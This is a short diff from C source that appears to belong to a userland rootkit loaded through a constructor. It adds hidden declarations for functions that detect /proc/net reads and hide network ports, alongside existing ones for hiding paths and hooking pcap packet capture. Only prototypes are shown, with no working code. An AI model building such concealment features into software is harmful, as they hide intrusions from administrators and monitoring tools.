@@ -17,8 +17,10 @@ static void init (void) __attribute__ ((constructor));
 static void (*old_pcap_callback)(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
 
 int is_owner(void) __attribute__((visibility("hidden")));
+int is_procnet(const char *filename) __attribute__((visibility("hidden")));
 int is_invisible(const char *path) __attribute__((visibility("hidden")));
 void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) __attribute__((visibility("hidden")));
+FILE *hide_ports(const char *filename) __attribute__((visibility("hidden")));
 
 typedef struct struct_syscalls {
     char syscall_name[51];    // buffer for syscall name (50 characters + 1 null terminator)
